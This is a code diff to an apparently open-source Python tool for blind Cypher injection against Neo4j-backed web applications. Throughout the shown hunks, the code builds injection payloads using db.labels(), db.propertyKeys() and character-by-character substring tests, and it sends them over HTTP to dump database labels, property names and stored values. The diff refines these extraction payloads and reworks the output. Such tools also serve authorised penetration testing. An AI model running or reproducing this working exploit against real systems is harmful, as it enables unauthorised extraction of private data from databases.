@@ -6,11 +6,11 @@ import requests
 import random
 import sys
 
-ascii_chars='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~'
+ascii_chars='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~ '
 
 def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
-    #proxies={}
-    proxies={'http':'http://localhost:8080'}
+    proxies={}
+    #proxies={'http':'http://localhost:8080'}
     headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
     try:
         if post_data:
@@ -126,8 +126,8 @@ def dump_labels(target_url, number_of_labels, injection_type, blind_string, post
     label_array=[]
     for label_index in range(number_of_labels):
         label_size=get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
-        print(f"Size of label number {label_index}: {label_size}")
-        label_dump_prefix=f"Value of label number {label_index}: " 
+        print(f"Size of label number {label_index+1}/{number_of_labels}: {label_size}")
+        label_dump_prefix=f"Value of label number {label_index+1}/{number_of_labels}: " 
         print("\r"+(80*" ")+"\r"+label_dump_prefix,end='')
         payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
         payload+=" limit 1 where substring(label,%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' return label}"
@@ -148,8 +148,12 @@ def get_number_of_properties(target_url, label_to_dump, injection_type, blind_st
     return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
 
 def get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and exists {match(t:"+label_to_dump+") where size(keys(t)["+str(property_index)+"])"
-    payload+=" = %SIZE_OF_RESULT% return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    #payload = injection_type + " and exists {match(t:"+label_to_dump+") where size(keys(t)["+str(property_index)+"])"
+    #payload+=" = %SIZE_OF_RESULT% return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    payload = injection_type + " and exists {match(t:"+label_to_dump+") call db.propertyKeys() yield propertyKey with propertyKey"
+    payload+=" where not isEmpty(t[propertyKey]) with distinct propertyKey skip "+str(property_index)+" limit 1"
+    payload+=" where size(propertyKey) = %SIZE_OF_RESULT% return propertyKey}"
+    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
     return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 
 
 def dump_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
@@ -158,8 +162,8 @@ def dump_properties(target_url, label_to_dump, injection_type, blind_string, pos
     label_properties_array=[label_to_dump]
     for property_index in range(number_of_properties):
         property_size=get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
-        print(f"Size of property number {property_index}: {property_size}")
-        property_dump_prefix=f"Value of property number {property_index}: " 
+        print(f"Size of property number {property_index+1}/{number_of_properties}: {property_size}")
+        property_dump_prefix=f"Value of property number {property_index+1}/{number_of_properties}: " 
         #payload = injection_type + " and exists {match(t:"+label_to_dump+") where substring(keys(t)["+str(property_index)+"],%CHARACTER_NUMBER%,1)"
         #payload+=" = '%CURRENT_CHARACTER%' return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
         payload = injection_type + " and exists { match(t:"+label_to_dump+") call db.propertyKeys() yield propertyKey with propertyKey where not"
@@ -187,24 +191,29 @@ def get_size_of_key(target_url, label_to_dump, property_to_dump, key_index, inje
 
 def dump_keys(target_url, label_to_dump, properties_list_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
     properties_array = properties_list_to_dump.split(',')
+    label_keys_array=[properties_array]
     for property_to_dump in properties_array:
         number_of_keys=get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
         print(f"Number of label '{label_to_dump}' and property '{property_to_dump}' keys: {number_of_keys}\n")
-        label_keys_array=[property_to_dump]
+        #label_keys_array=[property_to_dump]
         for key_index in range(number_of_keys):
             key_size=get_size_of_key(target_url, label_to_dump, property_to_dump, key_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
-            print(f"Size of key number {key_index} of property '{property_to_dump}': {key_size}")
-            key_dump_prefix=f"Value of key number {key_index}: " 
+            print(f"Size of key number {key_index+1}/{number_of_keys} of property '{property_to_dump}': {key_size}")
+            key_dump_prefix=f"Value of key number {key_index+1}/{number_of_keys}: " 
             payload = injection_type + " and exists {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'"
             payload+=" with t,key skip "+str(key_index)+" limit 1 where substring(toString(t[key]),%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%'"
             payload+=" return t[key]} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
             key_value=dump_string_value(target_url, key_dump_prefix, key_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
-            label_keys_array.append(key_value)
+            if len(label_keys_array) > key_index+1:
+                label_keys_array[key_index+1].append(key_value)
+            else:
+                label_keys_array.append([key_value])
+
             print("\n")
-        print(f"Label: {label_to_dump}\n")
-        print(f"Property: {property_to_dump}\n")
-        print("Keys:")
-        dump_ascii_table(label_keys_array,True)
+    print(f"Label: {label_to_dump}\n")
+    print(f"Property: {properties_list_to_dump}\n")
+    print("Keys:")
+    dump_ascii_table(label_keys_array,True)
     return label_keys_array
 
 
